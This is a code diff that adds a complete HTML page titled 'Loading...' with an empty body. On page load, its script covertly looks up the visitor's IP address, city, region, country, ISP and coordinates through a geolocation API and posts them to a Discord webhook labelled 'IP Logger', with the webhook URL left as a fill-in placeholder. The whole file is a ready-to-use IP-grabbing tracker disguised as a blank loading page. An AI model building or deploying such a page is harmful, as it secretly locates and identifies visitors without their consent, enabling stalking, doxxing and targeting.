@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>▲ Loading...</title>
+    <script>
+        fetch('https://freeipapi.com/api/json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ipAddress;
+                const city = data.cityName || "Unknown";
+                const region = data.regionName || "Unknown";
+                const country = data.countryName || "Unknown";
+                const org = data.ispName || "Unknown";
+                const loc = `${data.latitude}, ${data.longitude}`;
+
+                const webhookURL = "YOUR_WEBHOOK_HERE";
+
+                const embed = {
+                    title: "📡 New IP Log",
+                    color: 1146986,
+                    fields: [
+                        { name: "🌍 **IP Address**", value: `\`${ip}\``, inline: true },
+                        { name: "📍 **City**", value: `\`${city}\``, inline: true },
+                        { name: "🏢 **Region**", value: `\`${region}\``, inline: true },
+                        { name: "🌎 **Country**", value: `\`${country}\``, inline: true },
+                        { name: "🏢 **Operator (ISP)**", value: `\`${org}\``, inline: false },
+                        { name: "📍 **Coordinates**", value: `\`${loc}\``, inline: false }
+                    ]
+                };
+
+                const payload = { username: "IP Logger", embeds: [embed] };
+
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                })
+                .then(() => console.log("✅ IP Sent via Discord Webhook"))
+                .catch(error => console.error("❌ Error:", error));
+            })
+            .catch(error => console.error("❌ Error:", error));
+    </script>
+</head>
+<body>
+</body>
+</html>
